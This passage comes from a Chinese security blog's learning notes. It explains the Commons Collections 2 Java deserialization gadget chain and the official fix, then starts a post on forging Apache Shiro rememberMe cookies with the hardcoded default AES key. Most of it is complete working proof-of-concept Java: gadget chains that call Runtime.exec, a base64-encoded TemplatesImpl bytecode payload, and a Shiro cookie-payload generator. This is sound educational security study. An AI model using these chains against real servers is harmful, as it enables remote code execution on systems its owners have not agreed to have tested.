</a>&gt;</p><p>反序列化之后之所以要调用<code>heapify()</code>方法，是为了反序列化之后恢复顺序，相当于就是排序，而排序是靠将大的元素下移实现的，而将节点下移的函数就是<code>siftDown() </code>，而<code>comparator.compare()</code>⽤来⽐较两个元素⼤⼩</p><p><code>TransformingComparator</code>类实现了<code>java.util.Comparator</code>接⼝，这个接⼝⽤于定义两个对象如何⽐较；<code>siftDownUsingComparator()</code> 中就使⽤这个接⼝的<code>compare()</code>⽅法⽐较树的节点</p><p>差不多就是这样，但其实我感觉这和我们后面构造利用链基本上没有关系，大家了解就好</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>首先还是经典的<code>Transformer</code>，和之前的都一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] faketransfromer = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransfromer);</span><br></pre></td></tr></table></figure><p>然后把这个<code>ChainedTransformer</code>对象放入到创建的<code>TransformingComparator</code>对象里面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformerChain);</span><br></pre></td></tr></table></figure><p>然后再将这个<code>TransformingComparator</code>对象放入<code>PriorityQueue</code>中，它的构造方法中有两个参数，第一个参数是初始化时的大小，至少需要两个元素才能触发排序和比较，所以说一般来讲是2，当然比2大的任何整数都行；第⼆个参数是⽐较时的<code>Comparator</code>，传⼊前⾯实例化的<code>comparator</code>就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>后面随便添加两个非null的任意对象就行，这里就传两个数字进去比较简单，这个不重要哈哈哈</p><p>然后把真正恶意的<code>Transformer</code>放上去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformer);</span><br></pre></td></tr></table></figure><p>最后后面跟上序列化和反序列化的操作就行了，完整POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] faketransfromer = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransfromer);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformerChain);</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformer);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/07/CKlhxA4dzmGNTpS.png" alt="image.png"></p><p>成功弹出计算器</p><h2 id="改造POC"><a href="#改造POC" class="headerlink" title="改造POC"></a>改造POC</h2><p>前面我们提到了构造不含数组的POC，并且用那个打了<code>Shiro</code>，那么我们能不能把那个POC拿来改造成这种呢？肯定是可以的，而且和前面讲的也差不多，首先创建<code>TemplatesImpl</code>对象，然后创造一个人畜无害的<code>transformer</code>，里面随便调用一个方法就行，比如说<code>toString</code>，然后就和上面一样实例化<code>TransformingComparator</code>和<code>PriorityQueue</code>对象，但是这里我们得向队列中添加我们前面创建的<code>TemplatesImpl</code>对象，因为我们不能用数组了，所以说没办法通过<code>ConstantTransformer</code>把对象传进来了，⽽在<code>Comparator#compare()</code> 时，队列⾥的元素将作为参数传⼊<code>transform()</code>⽅法，这就是传给<code>TemplatesImpl#newTransformer</code>的参数，相当于就执行<code>TemplatesImpl</code>对象里的<code>newTransformer()</code>方法</p><p>完整POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        </span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/07/L8pCRe1qzUY295X.png" alt="image.png"></p><p>成功弹出计算器</p><h2 id="官方修复方法"><a href="#官方修复方法" class="headerlink" title="官方修复方法"></a>官方修复方法</h2><p><code>Apache Commons Collections</code>官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2；先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法<code>FunctorUtils#checkUnsafeSerialization</code>，⽤于检测反序列化是否安全。如果开发者没有设置全局配置<code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会 抛出异常。 这个检查在常⻅的危险<code>Transformer</code>类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code>等的 <code>readObject</code> ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常；再看4.1，修复⽅式⼜不⼀样。4.1⾥，这⼏个危险<code>Transformer</code>类不再实现 <code>Serializable</code> 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了，更绝</p><p>这篇文章介绍了<code>commons-collections4.0</code>相较于3.2.1的变化，并且介绍了一款新的利用链，这款利用链只能在4.0的版本中工作，它就是<code>CommonsCollections 2</code>，还有官方对cc链的修复方法</p><p>这是p神Java安全漫谈中最后一篇关于<code>CommonsCollections</code>利用链的文章，再次感谢p神写出这么精彩的文章，还有没讲到的4、5、7我就自己琢磨琢磨吧，应该也问题不大，看了这么多天的cc链，其实原理也都是相通的</p><p>加油吧 Java安全 路还长着呢</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Collections-2&quot;&gt;&lt;a href=&quot;#Commons-Collections-2&quot; class=&quot;headerlink&quot; title=&quot;Commons Collections 2&quot;&gt;&lt;/a&gt;Commons Collections 2&lt;/h1&gt;&lt;p&gt;前面我们讲的cc链，都是基于&lt;code&gt;commons-collections:commons-collections&lt;/code&gt;这个版本的，当时的版本号是3.2.1，也就是老版本；但后来实际上又有了新的分支，版本号为4.0，接下来我们就来看看在这个版本中存在的反序列化漏洞&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之利用TemplatesImpl攻击Shiro</title>
    <link href="https://arsenetang.github.io/2022/03/03/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8TemplatesImpl%E6%94%BB%E5%87%BBShiro/"/>
    <id>https://arsenetang.github.io/2022/03/03/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8TemplatesImpl%E6%94%BB%E5%87%BBShiro/</id>
    <published>2022-03-02T16:00:00.000Z</published>
    <updated>2022-04-26T13:30:21.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用TemplatesImp攻击Shiro"><a href="#利用TemplatesImp攻击Shiro" class="headerlink" title="利用TemplatesImp攻击Shiro"></a>利用TemplatesImp攻击Shiro</h1><p>这篇文章虽然写的是攻击Shiro，但实际上跟shiro关系不算特别大，主要是利用<code>TemplatesImpl</code>构造一条cc的链子，其实我们都已经有<code>CommonsCollections6</code>这样可以通杀的利用链了，那么为什么还需要<code>TemplatesImpl</code>这种呢？因为<code>TemplatesImpl</code>理论上是可以执行任意Java代码的，通用性非常高</p><span id="more"></span><h2 id="Shiro反序列化是什么"><a href="#Shiro反序列化是什么" class="headerlink" title="Shiro反序列化是什么"></a>Shiro反序列化是什么</h2><p>其实我对Shiro也不是很了解，硬着头皮来写这篇文章，但这不影响来理解Shiro反序列化的原理，因为它的原理其实挺简单的：为了让浏览器或服务器重启后用户<strong>不丢失登录状态</strong>，Shiro支持将<strong>持久化信息序列化</strong>并加密后<strong>保存在Cookie的rememberMe字段中</strong>，下次读取时进行<strong>解密再反序列化</strong>；照理说加密过后应该是很安全的，但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的代码，然后放入<code>Cookie</code>的<code>rememberMe</code>字段中，进而触发反序列化漏洞</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里因为需要用到<code>Shiro</code>登录啥的，所以说还是需要一个简单的环境的，还好p神帮我们都搞好了，这里必须说p神yyds，没有他这个Java安全是真的难学，给出p神项目的地址：&lt;<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">JavaThings/shirodemo at master · phith0n/JavaThings · GitHub</a>&gt;，直接把文件夹<code>shirodemo</code>下载下来用idea打开就好了，这里需要进行个<code>maven</code>换源，网上找一个就行，然后我就遇到了个很坑的问题，因为我的本地仓库是在c盘的，所以说非管理员用户是没有修改权限的，这里是真的坑，所以说需要修改权限的，还好找到了篇好文章，如下图：</p><p><img src="https://s2.loli.net/2022/03/02/jUlfC2G7tXHu6Qk.png" alt="image.png"></p><p>成功解决，然后用<code>mvn package</code>将这个项目打包成<code>war</code>包，放到<code>Tomcat</code>的webapps目录下，然后打开Tomcat，访问<code>http://localhost:8080/shirodemo/</code>，就可以跳转到登录页面了：</p><p><img src="https://s2.loli.net/2022/03/02/OTiyh1oUKArkM2q.png" alt="image.png"></p><p>输入正确的账号密码：root/secret，就可以成功登录，这里我们抓个包，记得勾选<code>Remember me</code></p><p><img src="https://s2.loli.net/2022/03/02/nYsPWmIK7yMOdTG.png" alt="image.png"></p><p>可以看到服务器返回了我们一个<code>rememberMe</code>的<code>Cookie</code>，肯定是加密过的</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>因为<code>Shiro</code>对<code>Cookie</code>的处理方式是先将其<code>base64</code>解码，然后再<code>AES</code>解码，最后进行反序列化；所以说我们要构造<code>payload</code>的顺序就是先进行序列化，再<code>AES</code>加密，然后<code>Base64</code>加密，所以说其实构造的核心就是找到<code>AES</code>的密钥，而且shiro 1.2.4之前密钥是默认的，这就让<code>Shiro</code>反序列化的利用难度瞬间降低，而默认的密钥在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h2><p>那我们接下来我们就来写POC了，这里我们先用cc6的链子试试吧，前面的代码和cc6是一样的，大家可以参考我前面的文章，这里主要是要写一个加密，在shiro类中有一个内置类<code>AesCipherService</code>，这个类中有一个<code>encrypt</code>方法，只要告诉它明文和密钥它就可以直接加密了，这里我就直接写在主函数里面了，可能要方便理解一点儿吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line">        Transformer[] fakeTransformers=<span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        Field trans=ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        trans.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        trans.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密的代码在最下面，这里的内容如果看不太懂的话，建议回去复习一下前面的内容哦</p><p>运行这一段代码，它就会生成一段base64字符串，直接用这段poyload放burp里去打，发送给shiro</p><p>咦，并没有弹出计算器，而且这时候去看<code>Tomcat</code>，还有报错：</p><p><img src="https://s2.loli.net/2022/04/26/6EbQLUNixXdYv4T.png" alt="image.png"></p><h2 id="异常分析"><a href="#异常分析" class="headerlink" title="异常分析"></a>异常分析</h2><p>那么为什么会出现这个异常呢？其实这问题我也不算特别了解，因为我对Shiro也不算很熟，但是这里得报错内容是：<code>Unable to load class named [[Lorg.apache.commons.collections.Transformer;]</code>，意思是说不能加载<code>Transform[]</code>数组，原因我就不太清楚了，这里直接给出p神的结论：<strong>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。</strong>这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><h2 id="构造不含数组的反序列化链"><a href="#构造不含数组的反序列化链" class="headerlink" title="构造不含数组的反序列化链"></a>构造不含数组的反序列化链</h2><p>所以说，咱现在得想办法不用<code>Transform[]</code>数组，这时候我们就应该想到前面用<code>TemplatesImpl</code>构造的cc3的链子，这里我们还是使用<code>InvokerTransformer</code>，其中的数组只有两个元素，复习复习代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 